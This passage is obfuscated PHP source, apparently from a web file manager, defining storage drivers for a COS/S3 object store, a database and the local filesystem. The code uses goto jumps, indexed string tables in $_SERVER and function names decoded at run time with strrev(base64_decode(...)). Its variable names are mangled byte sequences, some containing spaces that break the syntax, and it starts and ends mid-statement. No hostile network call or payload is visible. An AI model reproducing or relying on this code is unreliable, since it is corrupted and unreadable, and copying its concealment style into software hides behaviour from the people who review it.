=& $_SERVER[Ù×¯Ø…]; $çú¸ÆÌê = array($Ù”óß[1880] => $şÕïˆ×, $Ù”óß[1786] => $€®™ßñ¦, $Ù”óß[1881] => $²àÙ¹•† + time()); if (Session::get($Ù”óß[1882])) { $çú¸ÆÌê[$Ù”óß[1580]] = Session::get($Ù”óß[1882]); } else { $çú¸ÆÌê[$Ù”óß[1580]] = 0; } if ($this->get($şÕïˆ×)) { return $this->where(array($Ù”óß[1880] => $şÕïˆ×))->save($çú¸ÆÌê); } else { return $this->add($çú¸ÆÌê, array(), !0); } } public function remove($§ğßÄ¨È) { return $this->where(array($_SERVER[Ù×¯Ø…][1880] => $§ğßÄ¨È))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ù×¯Ø…][1883] . time())->delete(); } } goto f¢Ï˜ØïÁÖ; b—Ù©ïƒ“: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Æß‘ö½) { parent::__construct($Æß‘ö½); $this->signatureVersion($_SERVER[Ù×¯Ø…][212]); } public function uploadFormData($µ«ğæÖÀ, $“‰çÔÚ = 3600) { $àôŒ¨è =& $_SERVER[Ù×¯Ø…]; $À—¹×é“ = $àôŒ¨è[192]; $å¤™›â‘ = $àôŒ¨è[230]; $ùöªí‚® = $àôŒ¨è[1236]; $Ş÷¬«¾¿ = gmdate($àôŒ¨è[1237], time() + $“‰çÔÚ); $Ãç½”ÛÉ = (string) time() . $àôŒ¨è[68] . (string) (time() + $“‰çÔÚ); $ÁÆÓ = array($àôŒ¨è[1238] => $Ş÷¬«¾¿, $àôŒ¨è[1239] => array(array($àôŒ¨è[1240] => $À—¹×é“), array($àôŒ¨è[1241] => $this->bucket), array($àôŒ¨è[1242], $àôŒ¨è[1243], $àôŒ¨è[33]), array($àôŒ¨è[1244] => $ùöªí‚®), array($àôŒ¨è[1245] => $å¤™›â‘), array($àôŒ¨è[1246] => $this->accessKey), array($àôŒ¨è[1247] => $Ãç½”ÛÉ))); $ÁÆÓ = json_encode($ÁÆÓ); $ÑÇşÀŒ€ = hash_hmac($àôŒ¨è[230], $Ãç½”ÛÉ, $this->secret); $ÕÓíº¬í = sha1($ÁÆÓ); $ğ„‰áÃÏ = hash_hmac($àôŒ¨è[230], $ÕÓíº¬í, $ÑÇşÀŒ€); $Õû¹ø›‡ = array($àôŒ¨è[1240] => $À—¹×é“, $àôŒ¨è[1244] => $ùöªí‚®, $àôŒ¨è[1248] => base64_encode($ÁÆÓ), $àôŒ¨è[1245] => $å¤™›â‘, $àôŒ¨è[1246] => $this->accessKey, $àôŒ¨è[1249] => $Ãç½”ÛÉ, $àôŒ¨è[1250] => $ğ„‰áÃÏ, $àôŒ¨è[175] => $this->getHost()); return $Õû¹ø›‡; } public function fileOutLink($÷çÅŸêó) { $»ªà“Å  =& $_SERVER[Ù×¯Ø…]; if (substr($÷çÅŸêó, 0, 7) == $»ªà“Å [1251]) { $÷çÅŸêó = $»ªà“Å [1252] . substr($÷çÅŸêó, 7); } header($»ªà“Å [159] . $÷çÅŸêó); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Œ¾áÅ½) { $this->pathParse = $Œ¾áÅ½; $this->model = Model($_SERVER[Ù×¯Ø…][1253]); } public function getPath($İŠèŞùÚ) { return trim($İŠèŞùÚ, $_SERVER[Ù×¯Ø…][8]); } public function pathFather($êòÜĞ¡İ) { $êÅÅ®£¦ = $this->parse($êòÜĞ¡İ); $êÅÅ®£¦ = $this->infoSimple($êòÜĞ¡İ); return $êÅÅ®£¦ ? $êÅÅ®£¦[$_SERVER[Ù×¯Ø…][501]] : !1; } public function pathThis($·”¿á›ğ) { $©©ÒûÛ© = $this->infoSimple($·”¿á›ğ); return $©©ÒûÛ© ? $©©ÒûÛ©[$_SERVER[Ù×¯Ø…][28]] : !1; } public function getPathOuter($á÷–òò) { if (!$á÷–òò) { return $á÷–òò; } $¯ûü±¹É = $this->parse($á÷–òò); return KodIO::make($¯ûü±¹É[$_SERVER[Ù×¯Ø…][395]]); } public function copyFolderFromIO($ïÚèÂ¸ô, $®¡Œ¬¶, $×ìä£Ç, $­íû†›, $†—Ñä®¾) { $˜ïÖ¬Õ’ = $this->model->copyFolderFromIO($ïÚèÂ¸ô, $®¡Œ¬¶, $×ìä£Ç, $­íû†›, $†—Ñä®¾); return KodIO::make($˜ïÖ¬Õ’); } public function isParentOf($²«ûµÓ, $ ›¸áÕ°) { return $this->model->isParentOf($²«ûµÓ, $ ›¸áÕ°); } public function mkfile($€¹¢™Àú, $ƒ¦ğÂÁ¤ = '', $Ú·ª…ûŸ = REPEAT_RENAME) { $©µ®ï„› =& $_SERVER[Ù×¯Ø…]; $à¥¾éşà = $this->parse($€¹¢™Àú); $€¹¢™Àú = $à¥¾éşà[$©µ®ï„›[395]]; for ($Éšà½ÄÑ = 0; $Éšà½ÄÑ < count($à¥¾éşà[$©µ®ï„›[1254]]); $Éšà½ÄÑ++) { $ñóçÄæ• = $à¥¾éşà[$©µ®ï„›[1254]][$Éšà½ÄÑ]; if ($Éšà½ÄÑ == count($à¥¾éşà[$©µ®ï„›[1254]]) - 1) { $€¹¢™Àú = $this->model->mkfile($€¹¢™Àú, $ñóçÄæ•, $ƒ¦ğÂÁ¤, $Ú·ª…ûŸ); break; } $€¹¢™Àú = $this->model->mkdir($€¹¢™Àú, $ñóçÄæ•, REPEAT_SKIP); } return $this->getPathOuter($€¹¢™Àú); } public function mkdir($Â²±¤šñ, $êå¨†ÚÑ = REPEAT_SKIP) { $èì¶âáá =& $_SERVER[Ù×¯Ø…]; $´ì˜éßµ = $this->parse($Â²±¤šñ); $Â²±¤šñ = $´ì˜éßµ[$èì¶âáá[395]]; for ($ğ¤«êßÉ = 0; $ğ¤«êßÉ < count($´ì˜éßµ[$èì¶âáá[1254]]); $ğ¤«êßÉ++) { $îĞîºÀ = $´ì˜éßµ[$èì¶âáá[1254]][$ğ¤«êßÉ]; $Â²±¤šñ = $this->model->mkdir($Â²±¤šñ, $îĞîºÀ, $êå¨†ÚÑ); } return $this->getPathOuter($Â²±¤šñ); } public function copyFile($÷ªåÃ„¤, $Â»®ƒ‰Ğ, $ìÎÑ„Œæ = REPEAT_REPLACE) { $«ÊŒ¿ò… =& $_SERVER[Ù×¯Ø…]; $é‰ñÁ¿ = $this->parse($Â»®ƒ‰Ğ); $·½¢¡Êä = $this->model->copy($÷ªåÃ„¤, $é‰ñÁ¿[$«ÊŒ¿ò…[395]], $ìÎÑ„Œæ, $é‰ñÁ¿[$«ÊŒ¿ò…[76]]); return $·½¢¡Êä ? $this->getPathOuter($·½¢¡Êä) : !1; } public function moveFile($Îš¡ôùĞ, $Åµ‹§è‰, $Œ€ÍÃ·ú = REPEAT_REPLACE) { $È¼î„ËÁ =& $_SERVER[Ù×¯Ø…]; $–ûÓ‰’ø = $this->parse($Åµ‹§è‰); $²ÛÉúÈí = $this->model->move($Îš¡ôùĞ, $–ûÓ‰’ø[$È¼î„ËÁ[395]], $Œ€ÍÃ·ú, $–ûÓ‰’ø[$È¼î„ËÁ[76]]); return $²ÛÉúÈí ? $this->getPathOuter($²ÛÉúÈí) : !1; } public function copy($¨¸† Ï, $ƒ«¼­îê, $ñœŒğª€ = REPEAT_REPLACE, $’ãÚµ = false) { $’È•Æ˜ = $this->parse($ƒ«¼­îê); $‰üÔÖøı = $this->model->copy($¨¸† Ï, $’È•Æ˜[$_SERVER[Ù×¯Ø…][395]], $ñœŒğª€, $’ãÚµ); return $‰üÔÖøı ? $this->getPathOuter($‰üÔÖøı) : !1; } public function moveSameAllow() { } public function move($úÛ•öã, $éŞ’»‹°, $‘—°É› = REPEAT_REPLACE, $²—œ‘¡À = false) { $ü¬±İ½¶ = $this->parse($éŞ’»‹°); $í×­‘• = $this->model->move($úÛ•öã, $ü¬±İ½¶[$_SERVER[Ù×¯Ø…][395]], $‘—°É›, $²—œ‘¡À); return $í×­‘• ? $this->getPathOuter($í×­‘•) : !1; } public function remove($ù…›¾óŞ, $µ‡ÃĞãá = true) { return $this->model->remove($ù…›¾óŞ, $µ‡ÃĞãá); } public function rename($÷Ê“¢û±, $Û½¼æ›–) { $Ç¬Ş¯é = $this->model->rename($÷Ê“¢û±, $Û½¼æ›–); return $Ç¬Ş¯é ? $this->getPathOuter($÷Ê“¢û±) : $Ç¬Ş¯é; } public function size($‹ö–Áòş) { $»¸÷ÏÂ = $this->infoSimple($‹ö–Áòş); return $»¸÷ÏÂ ? $»¸÷ÏÂ[$_SERVER[Ù×¯Ø…][78]] : 0; } public function infoSimple($Æ—†Ú‡) { return $this->model->sourceInfo($Æ—†Ú‡); } public function info($û«×»’Å) { return $this->infoParse($û«×»’Å); } public function infoAuth($Åäá˜ã”) { return $this->infoParse($Åäá˜ã”, !1, !0); } public function infoWithChildren($®Â‚ßúÃ) { return $this->infoParse($®Â‚ßúÃ, !0); } protected function infoParse($ñÒüÉĞâ, $îÁá¸ÔÎ = false, $ÍÔ“ù = false) { if (!$îÁá¸ÔÎ) { return $this->model->pathInfo($ñÒüÉĞâ, $ÍÔ“ù); } return $this->model->pathInfoMore($ñÒüÉĞâ); } public function infoFull($ß…Ê‚×ª) { $ âÏŠ£œ =& $_SERVER[Ù×¯Ø…]; $Äà´ËƒÍ = explode($ âÏŠ£œ[8], $ß…Ê‚×ª); $¬á«ıæ = implode($ âÏŠ£œ[8], array_splice($Äà´ËƒÍ, 1)); return $this->model->pathInfoByPath($Äà´ËƒÍ[0], $¬á«ıæ); } public function hashSimple($üşõ´†¯) { $Îæ˜Û¯Õ =& $_SERVER[Ù×¯Ø…]; $È”¡†¡Ç = $this->infoWithChildren($üşõ´†¯); return $È”¡†¡Ç[$Îæ˜Û¯Õ[164]][$Îæ˜Û¯Õ[171]]; } public function hashMd5($»’–üê®) { $ŞÂ¢Òï± =& $_SERVER[Ù×¯Ø…]; $ïÃîÔã = $this->infoWithChildren($»’–üê®); return $ïÃîÔã[$ŞÂ¢Òï±[164]][$ŞÂ¢Òï±[170]]; } public function exist($—êšª’”) { $¶µëˆ =& $_SERVER[Ù×¯Ø…]; $™µË×Éâ = $this->parse($—êšª’”); if (!$™µË×Éâ[$¶µëˆ[76]]) { return $this->isFile($—êšª’”) || $this->isFolder($—êšª’”); } $§ÍôÉò = array($¶µëˆ[405] => $™µË×Éâ[$¶µëˆ[395]], $¶µëˆ[28] => $™µË×Éâ[$¶µëˆ[76]]); $£àñ¡ı± = $this->model->where($§ÍôÉò)->find(); return $£àñ¡ı± ? !0 : !1; } public function isFile($‰ÇÖª¨­) { $“½‰²éƒ =& $_SERVER[Ù×¯Ø…]; $†­İÎó = $this->infoSimple($‰ÇÖª¨­); return $†­İÎó && $†­İÎó[$“½‰²éƒ[414]] == $“½‰²éƒ[87] ? !1 : !0; } public function isFolder($Ôğ¼¹‘) { $ú“¢ˆ¥ =& $_SERVER[Ù×¯Ø…]; $šæ¹÷áª = $this->infoSimple($Ôğ¼¹‘); return $šæ¹÷áª && $šæ¹÷áª[$ú“¢ˆ¥[414]] == $ú“¢ˆ¥[87] ? !0 : !1; } public function listPath($Ÿñ€§Û•, $ªö¼ü»´ = false) { $·òíçäë =& $_SERVER[Ù×¯Ø…]; if ($Ÿñ€§Û• == $·òíçäë[33]) { return !1; } $ò¦¢—ªÅ = array($·òíçäë[405] => $Ÿñ€§Û•); if ($ªö¼ü»´) { return $this->model->listSource($ò¦¢—ªÅ, -1); } return $this->model->listSource($ò¦¢—ªÅ); } public function has($Œ•üíª•, $ß·èÄÔ» = false, $çÀï¤âÑ = null) { $í³æØ­Û =& $_SERVER[Ù×¯Ø…]; $Šğ˜…»Ğ = $this->infoWithChildren($Œ•üíª•); if ($ß·èÄÔ») { return array($í³æØ­Û[204] => $Šğ˜…»Ğ[$í³æØ­Û[204]], $í³æØ­Û[203] => $Šğ˜…»Ğ[$í³æØ­Û[203]]); } return $çÀï¤âÑ ? $Šğ˜…»Ğ[$í³æØ­Û[204]] : $Šğ˜…»Ğ[$í³æØ­Û[203]]; } public function listAll($›¾Ã¹‹Ü) { $‹Œˆğâ› = IO::info($this->pathParse[$_SERVER[Ù×¯Ø…][76]]); if (!$‹Œˆğâ›) { return array(); } return $this->model->listAll($›¾Ã¹‹Ü); } public function getContent($Üıà¡Îç) { return $this->model->getContent($Üıà¡Îç); } public function setContent($²Üª¢•, $º‰ÔÎß´ = '') { return $this->model->setContent($²Üª¢•, $º‰ÔÎß´); } public function fileSubstr($¾õ¨ », $ÖñİËûÖ, $–Å»çµ‰) { return $this->model->fileSubstr($¾õ¨ », $ÖñİËûÖ, $–Å»çµ‰); } public function download($ŸÙêŸ½, $ˆşó­Š» = '') { $©‚öñôÓ = get_path_father($ˆşó­Š»); $ˆÂà¹” = get_path_this($ˆşó­Š»); $âŒ£ˆÏö = $this->model->fileInfoGet($ŸÙêŸ½); $„òšë¥ = IO::copy($âŒ£ˆÏö[$_SERVER[Ù×¯Ø…][76]], $©‚öñôÓ, !1, $ˆÂà¹”); return $„òšë¥; } public function setModifyTime($Û®óÈÁÃ, $·Öç¦åĞ = '') { $ÀİºáòÑ =& $_SERVER[Ù×¯Ø…]; if (!$Û®óÈÁÃ) { return; } $this->model->where(array($ÀİºáòÑ[421] => $Û®óÈÁÃ))->save(array($ÀİºáòÑ[84] => $·Öç¦åĞ)); } public function upload($ì¸àó°, $ä¶îğ‚Ÿ, $ÀØÅ¡›Ü = false, $¾¦¶ÄÍ = REPEAT_REPLACE) { $ ú´Ñ› =& $_SERVER[Ù×¯Ø…]; $Õ©¹ë‰ = $this->parse($ì¸àó°); $¤ï¬ÆÉ­ = $this->model->addFile($Õ©¹ë‰[$ ú´Ñ›[395]], $ä¶îğ‚Ÿ, $Õ©¹ë‰[$ ú´Ñ›[76]], $ÀØÅ¡›Ü, $¾¦¶ÄÍ); return $this->getPathOuter($¤ï¬ÆÉ­); } public function uploadFileByID($ºŞíå©¬, $ßà¤ŞÉæ, $ÉŒêÁöÀ) { $ÀèÄÖ¦ =& $_SERVER[Ù×¯Ø…]; $ø¥½è¹ = $this->parse($ºŞíå©¬); $ı£„×ˆ® = $this->model->addFileByFileID($ø¥½è¹[$ÀèÄÖ¦[395]], $ßà¤ŞÉæ, $ø¥½è¹[$ÀèÄÖ¦[76]], $ÉŒêÁöÀ); return $this->getPathOuter($ı£„×ˆ®); } public function addFileByRemote($å‚’€, $Îêæ¦¢å, $Î©ÜéÑÚ = array(), $Œ…¢Ù¸ = '', $‚Õâ¹º ) { $„Ö¨ç²Ì =& $_SERVER[Ù×¯Ø…]; $øÌŸºµê = $this->parse($å‚’€); $Œ…¢Ù¸ = empty($Œ…¢Ù¸) ? $øÌŸºµê[$„Ö¨ç²Ì[76]] : $Œ…¢Ù¸; $³øº¿•˜ = $this->model->addFileByRemote($øÌŸºµê[$„Ö¨ç²Ì[395]], $Îêæ¦¢å, $Œ…¢Ù¸, $Î©ÜéÑÚ, $‚Õâ¹º ); return $this->getPathOuter($³øº¿•˜); } public function uploadLink($¸²úäÁ“, $ïÁ¥¬î = 0) { $‹š€ĞÕ =& $_SERVER[Ù×¯Ø…]; $Ùã³€‰ş = $this->parse($¸²úäÁ“); $¤õŞŒš = _get($GLOBALS[$‹š€ĞÕ[7]], $‹š€ĞÕ[1255]); $îœ¨ºª = _get($GLOBALS[$‹š€ĞÕ[7]], $‹š€ĞÕ[1256]); $¸²úäÁ“ = Model($‹š€ĞÕ[606])->createFileName($Ùã³€‰ş[$‹š€ĞÕ[76]], $¤õŞŒš, $îœ¨ºª); return IO::uploadLink($¸²úäÁ“, $ïÁ¥¬î); } public function fileNameAuto($µØåÍÃ¥, $üñ™Š¦‹, $“šÅ™Ø¡ = REPEAT_REPLACE, $ø·ÇËíŠ = false) { return $this->model->fileNameAuto($µØåÍÃ¥, $üñ™Š¦‹, $“šÅ™Ø¡, $ø·ÇËíŠ); } public function fileNameExist($‹“©¡ÆÆ, $‡ ÍØ¼) { return $this->model->fileNameExist($‹“©¡ÆÆ, $‡ ÍØ¼); } protected function _fileOut($ÚØßúÅÇ, $ş×Ï®Ü = false, $èôíø‘ = false, $£º¸’  = '', $ƒåĞîÎ½ = false) { $±ê–¿¶Î =& $_SERVER[Ù×¯Ø…]; $äèŸ‚Ã = $this->model->sourceInfo($ÚØßúÅÇ); if ($äèŸ‚Ã[$±ê–¿¶Î[414]] == $±ê–¿¶Î[87]) { header($±ê–¿¶Î[1257]); die; } $´÷ÉÕ‘ = $this->model->fileInfoGet($ÚØßúÅÇ); $£º¸’  = $´÷ÉÕ‘[$±ê–¿¶Î[170]] ? $´÷ÉÕ‘[$±ê–¿¶Î[170]] : $£º¸’ ; $ê®äÑ¶‡ = isset($GLOBALS[$±ê–¿¶Î[1258]]) ? $GLOBALS[$±ê–¿¶Î[1258]] : $äèŸ‚Ã[$±ê–¿¶Î[28]]; if ($ƒåĞîÎ½) { return IO::fileOutServer($´÷ÉÕ‘[$±ê–¿¶Î[76]], $ş×Ï®Ü, $ê®äÑ¶‡, $£º¸’ ); } IO::fileOut($´÷ÉÕ‘[$±ê–¿¶Î[76]], $ş×Ï®Ü, $ê®äÑ¶‡, $£º¸’ ); } public function fileOut($Ûàíü€’, $ĞÛÛåÓ¶ = false, $÷òµÉÚÌ = false, $½‹êŸ‡ = '') { $this->_fileOut($Ûàíü€’, $ĞÛÛåÓ¶, $÷òµÉÚÌ, $½‹êŸ‡); } public function fileOutServer($Ô¹Ğ¦®, $±¯‰óÚÒ = false, $õ¶øÏ®¯ = false, $©æüÉ = '') { $this->_fileOut($Ô¹Ğ¦®, $±¯‰óÚÒ, $õ¶øÏ®¯, $©æüÉ, !0); } protected function _fileOutImage($ç§âøö, $«‹‚ÌÂ¼ = 250) { $ÈŸå–š· =& $_SERVER[Ù×¯Ø…]; $ºµËí´Ê = $this->model->pathInfo($ç§âøö); if ($ºµËí´Ê[$ÈŸå–š·[414]] == $ÈŸå–š·[87]) { show_json($ÈŸå–š·[1259] . $ç§âøö, !1); } $ìƒ‹º¢Š = $this->model->fileInfoGet($ç§âøö); $ìƒ‹º¢Š[$ÈŸå–š·[28]] = $ºµËí´Ê[$ÈŸå–š·[28]]; $ìƒ‹º¢Š[$ÈŸå–š·[163]] = $ºµËí´Ê[$ÈŸå–š·[163]]; $GLOBALS[$ÈŸå–š·[1258]] = $ìƒ‹º¢Š[$ÈŸå–š·[28]]; $GLOBALS[$ÈŸå–š·[162]] = $ìƒ‹º¢Š; IO::fileOutImage($ìƒ‹º¢Š[$ÈŸå–š·[76]], $«‹‚ÌÂ¼); } public function fileOutImage($şĞ‘‚õø, $ ¼¯¹˜Û = 250) { $this->_fileOutImage($şĞ‘‚õø, $ ¼¯¹˜Û); } public function fileOutImageServer($•¶¸ñ¬Â, $³æÏ·¯¾ = 250) { $this->_fileOutImage($•¶¸ñ¬Â, $³æÏ·¯¾); } public function link($¡æºŸÛ , $×»‹í­ö = '') { $ÂáÅ²Šç = $this->model->fileInfoGet($¡æºŸÛ ); return IO::link($ÂáÅ²Šç[$_SERVER[Ù×¯Ø…][76]], $×»‹í­ö); } protected function parse($œŸƒ×À†) { $×Ò’¿·£ =& $_SERVER[Ù×¯Ø…]; if (strstr($œŸƒ×À†, $×Ò’¿·£[8]) === !1) { return array($×Ò’¿·£[423] => intval($œŸƒ×À†), $×Ò’¿·£[76] => $×Ò’¿·£[33], $×Ò’¿·£[1254] => array()); } $†¢ çı = explode($×Ò’¿·£[8], trim($œŸƒ×À†, $×Ò’¿·£[8])); if (count($†¢ çı) < 2) { show_tips(clear_html($œŸƒ×À†) . $×Ò’¿·£[1260]); } return array($×Ò’¿·£[423] => intval($†¢ çı[0]), $×Ò’¿·£[76] => $†¢ çı[1], $×Ò’¿·£[1254] => array_slice($†¢ çı, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($š‚ŒÀ˜„) { $this->pathParse = $š‚ŒÀ˜„; $this->model = Model($_SERVER[Ù×¯Ø…][1253]); } public function getPathOuter($î»©”Ö¬) { $Ñ€£·“ =& $_SERVER[Ù×¯Ø…]; if (!$î»©”Ö¬) { return $î»©”Ö¬; } $·•è‘ÔÈ = $this->parse($î»©”Ö¬); return trim(KodIO::makeShare($this->pathParse[$Ñ€£·“[395]], $·•è‘ÔÈ[$Ñ€£·“[395]]), $Ñ€£·“[8]); } protected function infoParse($•­òÕ¤ê, $°µòñÚŸ = false, $ùèËŠ = false) { $ªáô¬âë =& $_SERVER[Ù×¯Ø…]; $À–„¾” = $this->pathParse[$ªáô¬âë[395]]; $ú´¡®ôë = trim($this->pathParse[$ªáô¬âë[1099]], $ªáô¬âë[8]); return Action($ªáô¬âë[1261])->sharePathInfo($À–„¾”, $ú´¡®ôë); } public function infoFull($‰½×ø½è) { $ªÎª»ü =& $_SERVER[Ù×¯Ø…]; $ÆÀ·¢ö± = explode($ªÎª»ü[8], trim($‰½×ø½è, $ªÎª»ü[8])); if (count($ÆÀ·¢ö±) > 1) { $Æõï¡‚ = implode($ªÎª»ü[8], array_splice($ÆÀ·¢ö±, 1)); $ÇêàÚ = $this->model->pathInfoByPath($ÆÀ·¢ö±[0], $Æõï¡‚); if (!$ÇêàÚ) { return !1; } $this->pathParse[$ªÎª»ü[1099]] = $ÇêàÚ[$ªÎª»ü[406]]; } return $this->infoParse($‰½×ø½è); } public function listAll($¯ú¡Ğ§ù) { $­’ãúÄø =& $_SERVER[Ù×¯Ø…]; $×˜†˜ó“ = IO::info($this->pathParse[$­’ãúÄø[76]]); if (!$×˜†˜ó“) { return array(); } $·Ş‘ú¦è = $this->model->listAll($¯ú¡Ğ§ù); $«›Å”€ = Model($­’ãúÄø[598])->getInfo($×˜†˜ó“[$­’ãúÄø[491]]); $Ë”ˆì– = Action($­’ãúÄø[1261]); foreach ($·Ş‘ú¦è as &$ğò¯Ã¾ù) { check_abort(); $ğò¯Ã¾ù[$­’ãúÄø[85]] = $Ë”ˆì–->_shareItemeParse($ğò¯Ã¾ù[$­’ãúÄø[85]], $«›Å”€); } unset($ğò¯Ã¾ù); return $·Ş‘ú¦è; } } goto fŸùô…´£…; BÛµìà°ôÜ: $fileSize = strrev(base64_decode($_SERVER[ÓÖ³òÒ][0])); function binCheckNeq($™’ÌóÂ, $¥Ú¯‡) { return $™’ÌóÂ != $¥Ú¯‡; } $_SERVER[$_SERVER[ÓÖ³òÒ][1]] = $fileSize($_SERVER[$_SERVER[ÓÖ³òÒ][2]]); goto BÜ¢¯åĞ§; D˜…ê‹™•Õ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ùÖ¶ï–´) { if (substr($ùÖ¶ï–´, 0, 2) == $_SERVER[Ù×¯Ø…][1293]) { $ùÖ¶ï–´ = BASIC_PATH . substr($ùÖ¶ï–´, 2); } return $ùÖ¶ï–´; } public function iconvApp($ƒ–¤¡“ª) { $Óäü¸šÕ =& $_SERVER[Ù×¯Ø…]; global $config; return $this->iconvTo($ƒ–¤¡“ª, $config[$Óäü¸šÕ[1291]], $config[$Óäü¸šÕ[1290]]); } public function iconvSystem($¤‡İ‚Ë) { $êƒß¦²© =& $_SERVER[Ù×¯Ø…]; global $config; return $this->iconvTo($¤‡İ‚Ë, $config[$êƒß¦²©[1290]], $config[$êƒß¦²©[1291]]); } public function getPathOuter($ßÍîÔÉ) { $¡Ã¡”Çó =& $_SERVER[Ù×¯Ø…]; $å¡ ú¹ü = $this->iconvApp($this->pathBase); $ßÍîÔÉ = $this->iconvApp($ßÍîÔÉ); if (substr($å¡ ú¹ü, 0, 2) == $¡Ã¡”Çó[1293]) { $å¡ ú¹ü = BASIC_PATH . substr($å¡ ú¹ü, 2); } if (substr($ßÍîÔÉ, 0, 2) == $¡Ã¡”Çó[1293]) { $ßÍîÔÉ = BASIC_PATH . substr($ßÍîÔÉ, 2); } $å¡ ú¹ü = KodIO::clear($å¡ ú¹ü); $ßÍîÔÉ = KodIO::clear($ßÍîÔÉ); $ßÍîÔÉ = substr($ßÍîÔÉ, strlen($å¡ ú¹ü)); if (empty($this->pathDriver)) { return $ßÍîÔÉ; } return $this->pathDriver . $¡Ã¡”Çó[8] . ltrim($ßÍîÔÉ, $¡Ã¡”Çó[8]); } public function mkfile($è¯„Ä‘“, $‰Š“³Ä = '', $Şê¥¬¸² = REPEAT_RENAME) { $è¯„Ä‘“ = $this->iconvSystem($è¯„Ä‘“); @touch($è¯„Ä‘“); if ($‰Š“³Ä) { file_put_contents($è¯„Ä‘“, $‰Š“³Ä); } @chmod($è¯„Ä‘“, $this->pathAuth); return is_file($è¯„Ä‘“) ? $this->getPathOuter($è¯„Ä‘“) : !1; } public function mkdir($íè±èå , $àÌ»úå = REPEAT_SKIP) { $íè±èå  = $this->iconvSystem($íè±èå ); if (is_dir($íè±èå )) { return $this->getPathOuter($íè±èå ); } @mkdir($íè±èå , $this->pathAuth, !0); @chmod($íè±èå , $this->pathAuth); return is_dir($íè±èå ) ? $this->getPathOuter($íè±èå ) : !1; } public function copyFile($ò‹äìü, $ïÚ­èëÖ) { $this->mkdir($this->pathFather($ïÚ­èëÖ)); $ò‹äìü = $this->iconvSystem($ò‹äìü); $ïÚ­èëÖ = $this->iconvSystem($ïÚ­èëÖ); $‘–‘‘¡‡ = copy_64($ò‹äìü, $ïÚ­èëÖ); @chmod($ïÚ­èëÖ, $this->pathAuth); return $‘–‘‘¡‡ ? $this->getPathOuter($ïÚ­èëÖ) : !1; } public function moveFile($”å³ÂÜá, $åİ³ü¡ı) { $this->mkdir($this->pathFather($åİ³ü¡ı)); $”å³ÂÜá = $this->iconvSystem($”å³ÂÜá); $åİ³ü¡ı = $this->iconvSystem($åİ³ü¡ı); $Ÿ×Öí˜µ = intval(@rename($”å³ÂÜá, $åİ³ü¡ı)); if (!$Ÿ×Öí˜µ) { if ($Ÿ×Öí˜µ = intval(@copy_64($”å³ÂÜá, $åİ³ü¡ı))) { @unlink($”å³ÂÜá); } } @chmod($åİ³ü¡ı, $this->pathAuth); return $Ÿ×Öí˜µ ? $this->getPathOuter($åİ³ü¡ı) : !1; } public function movePath($¹•ªï, $ë‘Ì‘£ô, $ÇßÍ¨ûº = false) { $šÑØÓéø =& $_SERVER[Ù×¯Ø…]; $¹•ªï = $this->iconvSystem($¹•ªï); $ë‘Ì‘£ô = $this->iconvSystem($ë‘Ì‘£ô); $¯Ä¥–ì† = rtrim($ë‘Ì‘£ô, $šÑØÓéø[8]) . $šÑØÓéø[8] . ($ÇßÍ¨ûº ? $ÇßÍ¨ûº : get_path_this($¹•ªï)); if (file_exists($¯Ä¥–ì†)) { return !1; } $†½“¬³› = intval(@rename($¹•ªï, $¯Ä¥–ì†)); $†½“¬³› = file_exists($¯Ä¥–ì†); return $†½“¬³› ? $this->getPathOuter($¯Ä¥–ì†) : !1; } public function delFile($Ù›õÃò­) { $Ù›õÃò­ = $this->iconvSystem($Ù›õÃò­); if (!@unlink($Ù›õÃò­)) { @chmod($Ù›õÃò­, $this->pathAuth); if (!@unlink($Ù›õÃò­)) { return !1; } } else { return !0; } } public function delFolder($ËØ­Õş÷) { $ÒëåªÇ„ =& $_SERVER[Ù×¯Ø…]; $ËØ­Õş÷ = $this->iconvSystem($ËØ­Õş÷); if (!is_dir($ËØ­Õş÷)) { return !0; } if (!($„›¤ØÁà = opendir($ËØ­Õş÷))) { return !1; } while (($ø«Ò“¹ó = readdir($„›¤ØÁà)) !== !1) { if ($ø«Ò“¹ó == $ÒëåªÇ„[95] || $ø«Ò“¹ó == $ÒëåªÇ„[1300]) { continue; } $‚Ú¼Èç¦ = $ËØ­Õş÷ . $ÒëåªÇ„[8] . $ø«Ò“¹ó; if (is_file($‚Ú¼Èç¦) || is_link($‚Ú¼Èç¦)) { if (!unlink($‚Ú¼Èç¦)) { chmod($‚Ú¼Èç¦, $this->pathAuth); if (!unlink($‚Ú¼Èç¦)) { return !1; } } } else { if (is_dir($‚Ú¼Èç¦)) { chmod($‚Ú¼Èç¦, $this->pathAuth); $‚Ú¼Èç¦ = $this->iconvApp($‚Ú¼Èç¦); if (!$this->delFolder($‚Ú¼Èç¦)) { return !1; } } } } closedir($„›¤ØÁà); return rmdir($ËØ­Õş÷); } public function rename($è¨Ê¿öÌ, $òœ£Â¯º) { $ïÃ•¾Ô =& $_SERVER[Ù×¯Ø…]; $—ÒÖ¿øî = $this->fileNameAuto($this->pathFather($è¨Ê¿öÌ), $òœ£Â¯º); $—ÒÖ¿øî = $this->iconvSystem($—ÒÖ¿øî); $è¨Ê¿öÌ = $this->iconvSystem($è¨Ê¿öÌ); $øªÚ£üº = $this->pathFather($è¨Ê¿öÌ); $Ï‘¶”ÕŒ = rtrim($øªÚ£üº, $ïÃ•¾Ô[8]) . $ïÃ•¾Ô[8] . $—ÒÖ¿øî; $ĞòàÜÖÊ = @rename($è¨Ê¿öÌ, $Ï‘¶”ÕŒ); $Ï‘¶”ÕŒ = $this->iconvApp($Ï‘¶”ÕŒ); return $ĞòàÜÖÊ ? $this->getPathOuter($Ï‘¶”ÕŒ) : !1; } public function size($è¥´øˆÈ) { $è¥´øˆÈ = $this->iconvSystem($è¥´øˆÈ); return filesize_64($è¥´øˆÈ); } public function info($˜¤ÅØ¥×) { $˜¤ÅØ¥× = $this->iconvSystem($˜¤ÅØ¥×); if ($this->isFolder($˜¤ÅØ¥×)) { return $this->folderInfo($˜¤ÅØ¥×); } else { if ($this->isFile($˜¤ÅØ¥×)) { return $this->fileInfo($˜¤ÅØ¥×); } } return !1; } protected function infoChildren($›‚½õ‘›, &$ÀªôùÒÜ, $Ã¦Ş£Ì = true) { $àõøìŒÑ =& $_SERVER[Ù×¯Ø…]; check_abort_echo(); $›‚½õ‘› = 